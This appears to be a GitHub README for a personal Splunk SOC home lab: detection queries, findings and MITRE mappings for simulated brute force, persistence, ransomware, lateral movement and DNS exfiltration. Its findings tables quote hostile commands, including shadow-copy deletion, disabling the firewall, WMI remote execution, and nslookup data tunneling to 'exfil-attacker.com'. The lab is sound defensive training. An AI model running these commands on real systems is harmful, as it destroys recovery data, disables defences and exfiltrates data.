# 🛡️ SOC Level 1 — Splunk Home Lab

> A hands-on SOC L1 home lab built to practice real-world threat detection, log analysis, and incident investigation using Splunk SIEM.

---

## 👨‍💻 About This Project

This repository documents my SOC Level 1 home lab where I simulate attacks on my own machine and use **Splunk** to detect, investigate, and report on them — just like a real SOC analyst would.

**Tools Used:**
- Splunk Enterprise (local)
- Windows Security Event Logs
- Windows System Event Logs
- Windows PowerShell Operational Logs
- Windows Firewall Logs
- Windows DNS Client Logs
- MITRE ATT&CK Framework

---

## 📁 Repository Structure

```
SOC-Lab-Splunk/
│
├── README.md
│
├── SPL-Queries/
│   ├── (16 lab .spl files)
│   ├── insider_threat_detection.spl
│   ├── ransomware_detection.spl
│   ├── lateral_movement_detection.spl
│   └── data_exfiltration_detection.spl
│
├── Investigation-Reports/
│   ├── (16 lab .md files)
│   ├── insider_threat_IR-2026-002.md
│   ├── ransomware_IR-2026-003.md
│   ├── lateral_movement_IR-2026-004.md
│   └── data_exfiltration_IR-2026-005.md
│
├── Incident-Reports/
│   ├── SOC_Incident_Report_IR-2026-001.docx
│   ├── IR-2026-002_Insider_Threat.docx
│   ├── IR-2026-003_Ransomware.docx
│   ├── IR-2026-004_Lateral_Movement.docx
│   └── IR-2026-005_Data_Exfiltration.docx
│
├── Scenarios/
│   ├── Scenario_01_Insider_Threat/
│   │   └── README.md
│   ├── Scenario_02_Ransomware/
│   │   └── README.md
│   ├── Scenario_03_Lateral_Movement/
│   │   └── README.md
│   └── Scenario_04_Data_Exfiltration/
│       └── README.md
│
├── Dashboards/
│   └── soc_security_dashboard.xml
│
└── screenshots/
    └── (45+ evidence screenshots)
```

---

# 🔬 PART 1 — 16 LAB SIMULATIONS

> Hands-on attack simulations using real Windows Event Logs detected in Splunk

---

## 📊 Labs Overview

| # | Attack Simulated | Event ID | MITRE ATT&CK | Severity | Status |
|---|---|---|---|---|---|
| 1 | Brute Force Login | 4625 | T1110 | Medium | ✅ Done |
| 2 | New User Account Created | 4720 | T1136 | High | ✅ Done |
| 3 | Account Lockout | 4740 | T1110 | High | ✅ Done |
| 4 | User Added to Admin Group | 4732 | T1098 | Critical | ✅ Done |
| 5 | RDP & Interactive Login | 4624 | T1078 / T1021.001 | Medium-High | ✅ Done |
| 6 | Suspicious PowerShell | 4104 | T1059.001 / T1027 | High-Critical | ✅ Done |
| 7 | Process Creation | 4688 | T1059 / T1087 | High | ✅ Done |
| 8 | Log Clearing | 1102 | T1070.001 | Critical | ✅ Done |
| 9 | Firewall Disabled | 4104/4950 | T1562.004 | Critical | ✅ Done |
| 10 | Scheduled Task Created | 4104/4698 | T1053.005 | High | ✅ Done |
| 11 | Malicious Service Installed | 7045 | T1543.003 | Critical | ✅ Done |
| 12 | Port Scan Detection | Firewall Log | T1046 | High | ✅ Done |
| 13 | DNS Query Analysis | DNS Log | T1071.004 | High | ✅ Done |
| 14 | SOC Security Dashboard | All Events | All | — | ✅ Done |
| 15 | Splunk Alerts | All Events | All | — | ✅ Done |
| 16 | Correlation Rules | All Events | Multiple | Critical | ✅ Done |

---

## 🧪 Lab 1 — Brute Force Detection
### SPL Query
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4625
| stats count by Account_Name, ComputerName
| where count >= 5
| sort -count
```
### Result
Splunk detected **7 failed login attempts** against account `hp` on host `JIMIL-JOSHI`.
📄 [Investigation Report](Investigation-Reports/brute_force_investigation.md)
![Raw Events](screenshots/01_raw_events.png)
![Stats Table](screenshots/02_stats_table.png)

---

## 🧪 Lab 2 — New User Account Created
### SPL Query
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4720
| table _time, Account_Name, ComputerName, Security_ID
```
### Result
Splunk detected creation of backdoor account `hacker` by `hp` on `JIMIL-JOSHI`.
📄 [Investigation Report](Investigation-Reports/new_user_investigation.md)
![New User Raw Event](screenshots/03_new_user_raw_event.png)
![New User Table](screenshots/04_new_user_table.png)

---

## 🧪 Lab 3 — Account Lockout Detection
### SPL Query
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4740
| table _time, Account_Name, ComputerName, Caller_Computer_Name
```
### Result
Splunk detected account lockout of `hp` on host `JIMIL-JOSHI`.
📄 [Investigation Report](Investigation-Reports/account_lockout_investigation.md)
![Lockout Raw Event](screenshots/05_lockout_raw_event.png)
![Lockout Table](screenshots/06_lockout_table.png)

---

## 🧪 Lab 4 — User Added to Administrators Group
### SPL Query
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4732
| table _time, Account_Name, ComputerName, Security_ID, Member_Security_ID
```
### Result
Splunk detected **5 group membership changes** by `hp` on `JIMIL-JOSHI`.
📄 [Investigation Report](Investigation-Reports/admin_group_investigation.md)
![Admin Group Raw Events](screenshots/07_admin_group_raw_events.png)
![Admin Group Security IDs](screenshots/08_admin_group_security_id.png)

---

## 🧪 Lab 5 — RDP & Interactive Login Detection
### SPL Query
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4624
| where Logon_Type=2
| stats count by Account_Name, ComputerName, Logon_Type
| sort -count
```
### Result
Splunk detected **4 successful interactive logins** by `hp` on `JIMIL-JOSHI`.
📄 [Investigation Report](Investigation-Reports/rdp_login_investigation.md)
![RDP Raw Events](screenshots/09_rdp_raw_events.png)
![RDP Stats Table](screenshots/10_rdp_stats_table.png)

---

## 🧪 Lab 6 — Suspicious PowerShell + Threat Hunting

### Part 1 — Basic Recon
```spl
index=main EventCode=4104
| table _time, ComputerName, Message
| sort -_time
```

### Part 2 — Advanced Threat Hunting
```spl
index=main EventCode=4104
| search Message="*Invoke*" OR Message="*WebClient*" OR Message="*ToBase64*" OR Message="*payload*"
| table _time, ComputerName, Message
| sort -_time
```
### Result
Detected **20 recon events** + **5 high risk events** including `Net.WebClient`, `Invoke-Expression`, `ToBase64String`.
📄 [Investigation Report](Investigation-Reports/powershell_investigation_v2.md)
![PowerShell Raw Events](screenshots/11_powershell_raw_events.png)
![PowerShell Commands](screenshots/12_powershell_commands_detected.png)
![Threat Hunt Raw](screenshots/13_powershell_threat_hunt_raw.png)
![Threat Hunt Commands](screenshots/14_powershell_threat_hunt_commands.png)

---

## 🧪 Lab 7 — Process Creation Detection
### SPL Query
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
| search New_Process_Name="*cmd.exe*" OR New_Process_Name="*net.exe*" OR New_Process_Name="*whoami*"
| table _time, Account_Name, New_Process_Name, Process_Command_Line
| sort -_time
| head 10
```
### Result
Splunk detected **613 process events** — `whoami` and `net localgroup administrators` confirmed.
📄 [Investigation Report](Investigation-Reports/process_creation_investigation.md)
![Process Filtered](screenshots/15_process_creation_filtered.png)
![Process Stats](screenshots/16_process_creation_stats.png)
![Process CMD Line](screenshots/17_process_creation_cmdline.png)

---

## 🧪 Lab 8 — Log Clearing Detection
### SPL Query
```spl
index=main sourcetype="WinEventLog:Security" EventCode=1102
| table _time, ComputerName, Account_Name, Message
| sort -_time
```
### Result
Splunk detected **2 log clearing events** — "The audit log was cleared" confirmed.
📄 [Investigation Report](Investigation-Reports/log_clearing_investigation.md)
![Log Clearing Raw Events](screenshots/18_log_clearing_raw_events.png)
![Log Clearing Table](screenshots/19_log_clearing_table.png)

---

## 🧪 Lab 9 — Windows Firewall Disabled
### SPL Query
```spl
index=main EventCode=4104
| search Message="*NetFirewall*" OR Message="*Enabled False*" OR Message="*Enabled True*"
| table _time, ComputerName, Message
| sort -_time
| head 20
```
### Result
Splunk detected **74 events** — `Set-NetFirewallProfile -Enabled False` confirmed.
📄 [Investigation Report](Investigation-Reports/firewall_disabled_investigation.md)
![Firewall Commands](screenshots/20_firewall_commands_detected.png)
![Firewall Stats](screenshots/21_firewall_stats_table.png)

---

## 🧪 Lab 10 — Scheduled Task Created
### SPL Query
```spl
index=main EventCode=4104
| search Message="*schtasks*" OR Message="*ScheduledTask*" OR Message="*WindowsUpdate*"
| table _time, ComputerName, Message
| sort -_time
| head 20
```
### Result
Splunk detected **27 events** — suspicious task `WindowsUpdate` detected on `JIMIL-JOSHI`.
📄 [Investigation Report](Investigation-Reports/scheduled_task_investigation.md)
![Scheduled Task Detected](screenshots/22_scheduled_task_detected.png)
![Scheduled Task Stats](screenshots/23_scheduled_task_stats.png)

---

## 🧪 Lab 11 — Malicious Service Installed
### SPL Query
```spl
index=main sourcetype="WinEventLog:System" EventCode=7045
| table _time, ComputerName, Message
| sort -_time
```
### Result
Splunk detected `FakeService` — binary `cmd.exe /c whoami` — auto start as LocalSystem.
📄 [Investigation Report](Investigation-Reports/service_installed_investigation.md)
![Service Raw Event](screenshots/24_service_installed_raw.png)
![Service Details](screenshots/25_service_installed_details.png)

---

## 🧪 Lab 12 — Port Scan Detection
### SPL Query
```spl
index=main sourcetype="firewall_log"
| rex field=_raw "(?P<action>\w+)\s+(?P<protocol>\w+)\s+(?P<src_ip>[\d.]+)\s+(?P<dst_ip>[\d.]+)\s+(?P<src_port>\d+)\s+(?P<dst_port>\d+)"
| stats count by dst_port, action
| sort -count
| head 20
```
### Result
Splunk detected **1,527 firewall events** — port scan across 1024 ports confirmed.
📄 [Investigation Report](Investigation-Reports/port_scan_investigation.md)
![Port Scan Raw Events](screenshots/26_port_scan_raw_events.png)
![Port Scan IP Stats](screenshots/27_port_scan_ip_stats.png)
![Port Scan Ports](screenshots/28_port_scan_ports.png)

---

## 🧪 Lab 13 — DNS Query Analysis
### SPL Query
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-DNS-Client/Operational"
| rex field=_raw "(?P<domain>[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})"
| stats count by domain
| sort -count
| head 20
```
### Result
Splunk detected **853 DNS events** — suspicious query for `suspicious-domain.xyz` confirmed.
📄 [Investigation Report](Investigation-Reports/dns_analysis_investigation.md)
![DNS Raw Events](screenshots/29_dns_raw_events.png)
![DNS Top Domains](screenshots/30_dns_top_domains.png)
![DNS Suspicious Domain](screenshots/31_dns_suspicious_domain.png)

---

## 🧪 Lab 14 — SOC Security Dashboard

### Dashboard Metrics
| Panel | Count |
|---|---|
| Failed Login Attempts | 38 |
| New User Accounts Created | 4 |
| Log Clearing Events | 2 |
| Privilege Escalation Events | 10 |
| Malicious Services Installed | 16 |
| Account Lockouts | 1 |
| PowerShell Events | 679 |
| Process Creation Events | 121,457 |

📄 [Dashboard Report](Investigation-Reports/soc_dashboard_report.md)
📄 [Dashboard XML](Dashboards/soc_security_dashboard.xml)
![SOC Dashboard Panels](screenshots/32_soc_dashboard_panels.png)
![SOC Dashboard Charts](screenshots/33_soc_dashboard_charts.png)
![SOC Dashboard Final](screenshots/35_soc_dashboard_final.png)

---

## 🧪 Lab 15 — Splunk Alerts

### Alerts Created
| Alert | Event ID | Severity | Status |
|---|---|---|---|
| Brute Force Detection | 4625 | 🟠 High | ✅ Enabled |
| Log Clearing — Critical | 1102 | 🔴 Critical | ✅ Enabled |
| New User Created | 4720 | 🟠 High | ✅ Enabled |
| Privilege Escalation | 4732 | 🔴 Critical | ✅ Enabled |
| Malicious Service Installed | 7045 | 🔴 Critical | ✅ Enabled |

### Result
Brute Force alert triggered **6 times** — automated detection confirmed working!
📄 [Alerts Report](Investigation-Reports/splunk_alerts_report.md)
![Splunk Alerts List](screenshots/36_splunk_alerts_list.png)
![Splunk Triggered Alerts](screenshots/37_splunk_triggered_alerts.png)

---

## 🧪 Lab 16 — Advanced Correlation Rules

### Rule 1 — Brute Force Then Successful Login
```spl
index=main sourcetype="WinEventLog:Security"
| eval event_type=case(EventCode="4625","Failed Login", EventCode="4624","Successful Login")
| where isnotnull(event_type)
| stats count(eval(EventCode="4625")) as failed_count, count(eval(EventCode="4624")) as success_count by Account_Name, ComputerName
| where failed_count >= 3 AND success_count >= 1
| eval risk="HIGH — Possible Successful Brute Force!"
| table Account_Name, ComputerName, failed_count, success_count, risk
```
**Result:** `hp` — 18 failed + 12 successful logins 🔴

### Rule 2 — Backdoor Admin Account
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4720 OR EventCode=4732
| stats count(eval(EventCode="4720")) as new_user, count(eval(EventCode="4732")) as added_to_admin by Account_Name, ComputerName
| where new_user >= 1 AND added_to_admin >= 1
| eval risk="CRITICAL — Backdoor Admin Account Created!"
| table Account_Name, ComputerName, new_user, added_to_admin, risk
```
**Result:** `hp` — 2 new users + 3 added to Admins 🔴

### Rule 3 — Attack Then Evidence Destroyed
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4625 OR EventCode=1102
| stats count(eval(EventCode="4625")) as failed_logins, count(eval(EventCode="1102")) as log_cleared by Account_Name, ComputerName
| where failed_logins >= 3 AND log_cleared >= 1
| eval risk="CRITICAL — Attack then Evidence Destroyed!"
| table Account_Name, ComputerName, failed_logins, log_cleared, risk
```
**Result:** `hp` — 18 failed logins + 3 log clearing events 🔴

📄 [Investigation Report](Investigation-Reports/correlation_rules_investigation.md)
![Correlation Brute Force](screenshots/38_correlation_brute_force.png)
![Correlation Backdoor Admin](screenshots/39_correlation_backdoor_admin.png)
![Correlation Attack Evidence](screenshots/40_correlation_attack_evidence.png)

---
---

# 🎯 PART 2 — ADVANCED SCENARIOS

> Real-world attack scenarios combining multiple techniques — advanced SOC investigation practice

---

## 📊 Scenarios Overview

| # | Scenario | MITRE ATT&CK | Severity | Status |
|---|---|---|---|---|
| 1 | Insider Threat Detection | T1136 / T1098 / T1070.001 | 🔴 Critical | ✅ Completed |
| 2 | Ransomware Detection | T1486 / T1490 | 🔴 Critical | ✅ Completed |
| 3 | Lateral Movement Detection | T1021 / T1021.002 / T1047 | 🔴 Critical | ✅ Completed |
| 4 | Data Exfiltration Detection | T1560 / T1048 / T1071.004 | 🔴 Critical | ✅ Completed |
| 5 | Phishing Attack | T1566 / T1059 | 🟠 High | 🔜 Coming |

---

## 🎯 Scenario 01 — Insider Threat Detection

### Story
> A disgruntled employee creates a backdoor admin account before leaving the company, then clears the security logs to destroy evidence. SOC analyst must detect the complete attack chain!

### Attack Chain Simulated
```
Step 1 → Backdoor account 'insider' created → Event 4720 ✅
Step 2 → Added to Administrators group → Event 4732 ✅
Step 3 → Security logs cleared → Event 1102 ✅
```

### Detection Query
```spl
index=main sourcetype="WinEventLog:Security"
(EventCode=4720 OR EventCode=4732 OR EventCode=1102)
| eval Attack=case(
    EventCode="4720","1-New User Created",
    EventCode="4732","2-Added to Admins",
    EventCode="1102","3-Log Clearing")
| stats count by Attack, Account_Name, ComputerName
| sort Attack
```

### Findings
| Attack Stage | Account | Computer | Count |
|---|---|---|---|
| 1-New User Created | insider | JIMIL-JOSHI | 1 🔴 |
| 2-Added to Admins | hp | JIMIL-JOSHI | 2 🔴 |
| 3-Log Clearing | hp | JIMIL-JOSHI | 1 🔴 |

### Verdict
**✅ TRUE POSITIVE — Complete Insider Threat Attack Chain Detected!**

📄 [Full Investigation Report](Investigation-Reports/insider_threat_IR-2026-002.md)
📄 [Scenario Details](Scenarios/Scenario_01_Insider_Threat/README.md)
📄 [Incident Report (Word)](Incident-Reports/IR-2026-002_Insider_Threat.docx)

![Insider Threat Detection](screenshots/insider_threat_detection.png)

---

## 🎯 Scenario 02 — Ransomware Detection

### Story
> An employee opens a malicious attachment. Files are renamed with a `.locked` extension and shadow copies are deleted to prevent recovery. A ransom note is dropped on disk. SOC analyst must detect the ransomware behavior before it spreads further!

### Attack Chain Simulated
```
Step 1 → Test files renamed with .locked extension (simulated encryption)
Step 2 → Shadow copies deleted via vssadmin (anti-recovery) → Event 4688 ✅
Step 3 → Ransom note file created on disk
```

### Detection Query (Final, Tuned Version)
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
| search New_Process_Name="*vssadmin*" OR Process_Command_Line="*delete shadows*" OR Process_Command_Line="*.locked*"
| eval Indicator=case(
    match(Process_Command_Line, "vssadmin"), "Shadow Copy Deletion",
    match(Process_Command_Line, "\.locked"), "Encrypted File Extension")
| table _time, Account_Name, ComputerName, Indicator, Process_Command_Line
| sort -_time
```

### Findings
| Time | Account | Indicator | Command |
|---|---|---|---|
| 15:41:34 | hp | Shadow Copy Deletion 🔴 | `vssadmin delete shadows /all /quiet` |
| 15:41:30 | hp | Shadow Copy Deletion 🔴 | `vssadmin delete shadows /all /quiet` |

### Real SOC Lesson — Query Tuning
An initial query matching `"ren"` caught false positives from Edge WebView/WhatsApp processes. Tuned to remove the broad match — a real demonstration of false-positive reduction.

### Detection Gap Identified
Shell built-ins (`echo`, `ren`) did not generate Event 4688 entries — recommendation: deploy Sysmon Event ID 11/23 for file-level visibility.

### Verdict
**✅ TRUE POSITIVE — Ransomware Behavior Confirmed**

📄 [Full Investigation Report](Investigation-Reports/ransomware_IR-2026-003.md)
📄 [Scenario Details](Scenarios/Scenario_02_Ransomware/README.md)
📄 [Incident Report (Word)](Incident-Reports/IR-2026-003_Ransomware.docx)

![Ransomware Shadow Copy Deletion](screenshots/ransomware_shadow_copy_deletion.png)

---

## 🎯 Scenario 03 — Lateral Movement Detection

### Story
> An attacker who has compromised one account attempts to move across the network using Windows admin shares and WMI remote execution — classic "living off the land" lateral movement techniques. SOC analyst must detect this movement using Splunk!

### Attack Chain Simulated
```
Step 1 → C$ admin share accessed → Network Logon (Type 3) → Event 4624 ✅
Step 2 → ADMIN$ share accessed (PsExec-style) → Event 4624 ✅
Step 3 → WMI remote command execution → Event 4688 ✅
```

### Detection Queries
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4624
| where Logon_Type=3
| table _time, Account_Name, ComputerName, Logon_Type, Source_Network_Address
| sort -_time
```
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
| search New_Process_Name="*wmic*" OR Process_Command_Line="*node*"
| table _time, Account_Name, New_Process_Name, Process_Command_Line
| sort -_time
```

### Findings
| Time | Account | Indicator | Detail |
|---|---|---|---|
| 09:31:29 | hp | Network Logon (Type 3) 🔴 | Source: 127.0.0.1 |
| 09:31:33 | hp | Network Logon (Type 3) 🔴 | Source: 127.0.0.1 |
| 09:31:36 | hp | WMI Remote Execution 🔴 | `wmic /node:127.0.0.1 process call create "whoami"` |

### Real SOC Insight — Behavioral Baseline
Account `hp`'s normal baseline is Interactive logon (Type 2, 4 events). The appearance of Network logon (Type 3, 2 events) — coinciding with admin share access — represents a measurable behavioral anomaly used to strengthen this finding.

### Verdict
**✅ TRUE POSITIVE — Lateral Movement Technique Confirmed**

📄 [Full Investigation Report](Investigation-Reports/lateral_movement_IR-2026-004.md)
📄 [Scenario Details](Scenarios/Scenario_03_Lateral_Movement/README.md)
📄 [Incident Report (Word)](Incident-Reports/IR-2026-004_Lateral_Movement.docx)

![Lateral Movement WMI Execution](screenshots/lateral_movement_wmi_execution.png)

---

## 🎯 Scenario 04 — Data Exfiltration Detection

### Story
> An attacker has gathered sensitive files and attempts to remove them from the network using a stealthy method — compressing the data, then exfiltrating it via DNS tunneling, encoding stolen data as subdomains of an attacker-controlled domain. SOC analyst must detect both the staging and the covert exfiltration channel!

### Attack Chain Simulated
```
Step 1 → Sensitive files compressed via Compress-Archive (data staging) → Event 4688 ✅
Step 2 → 8 rapid DNS queries to exfil-attacker.com, chunk-style subdomains → Event 4688 ✅
```

### Detection Queries
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
| search New_Process_Name="*powershell*" Process_Command_Line="*Compress-Archive*"
| table _time, Account_Name, New_Process_Name, Process_Command_Line
| sort -_time
```
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
| search New_Process_Name="*nslookup*"
| table _time, Account_Name, Process_Command_Line
| sort -_time
```

### Findings
| Time | Account | Indicator | Detail |
|---|---|---|---|
| 14:49:22 | hp | Data Staging 🔴 | `Compress-Archive -Path C:\SensitiveData\* -DestinationPath stolen_data.zip` |
| 14:49:31–14:49:34 | hp | DNS Tunneling 🔴 | 8x `nslookup chunkNNN.exfil-attacker.com` in ~4 seconds |

### Real SOC Lesson — Detection Gap
The dedicated DNS Client Operational log returned **0 events** for the suspicious domain — the same gap seen in the Ransomware scenario. A broader search across all sourcetypes revealed the evidence was fully captured instead via **Event 4688 (Process Creation)**, since each `nslookup` invocation spawns a logged process containing the full command line. Real SOC analysts must know multiple log sources for the same activity rather than relying on one.

### DNS Tunneling Pattern
All 8 queries targeted a single domain (`exfil-attacker.com`) with chunk-style subdomain labels (`chunk001`, `chunk002`...) and data-like labels (`secretdata789ghi`, `financedata456def`) — all within ~4 seconds, an abnormal frequency consistent with real-world DNS tunneling tools.

### Verdict
**✅ TRUE POSITIVE — Data Exfiltration Confirmed**

📄 [Full Investigation Report](Investigation-Reports/data_exfiltration_IR-2026-005.md)
📄 [Scenario Details](Scenarios/Scenario_04_Data_Exfiltration/README.md)
📄 [Incident Report (Word)](Incident-Reports/IR-2026-005_Data_Exfiltration.docx)

![Data Exfiltration DNS Tunneling](screenshots/data_exfiltration_dns_tunneling.png)

---

## 🎯 Skills Demonstrated

- Windows Security & System Event Log analysis
- PowerShell Script Block Log analysis
- Windows Firewall & DNS Log analysis
- Process Creation & Command Line logging
- Anti-forensics & defense evasion detection
- Persistence & privilege escalation detection
- Insider threat detection
- Ransomware behavior detection
- Lateral movement detection (admin shares + WMI)
- Data exfiltration & DNS tunneling detection
- Behavioral baseline / anomaly analysis
- Detection rule tuning & false positive reduction
- Log source visibility gap identification & workaround
- Port scan & DNS C2 detection
- Advanced correlation rule development
- Multi-event attack chain detection
- SPL query writing and optimization
- Splunk Dashboard & Alert configuration
- Professional incident documentation
- MITRE ATT&CK framework mapping
- Threat hunting techniques

---

## 🏆 Certifications

| Certificate | Issuer | Date |
|---|---|---|
| SOC Level 1 Learning Path — 65hrs (THM-7FX2PT6FWN) | TryHackMe | Apr 2026 |
| Cyber Job Simulation — Cybersecurity | Deloitte (Forage) | Apr 2026 |
| Cybersecurity Analyst Simulation — IAM | TATA (Forage) | Apr 2026 |
| Cyber Smart — Basic Cyber Security | Ministry of Home Affairs, India | May 2026 |

---

## 🚀 Coming Next

- [ ] Scenario 05 — Phishing Attack Detection
- [ ] BOTS (Boss of the SOC) Investigation

---

## 📬 Connect

**Jimil Joshi** — Aspiring SOC Analyst
🔗 [LinkedIn](https://www.linkedin.com/in/jimil-joshi-soc-analyst)
🔗 [GitHub](https://github.com/jimil-joshi-8115)
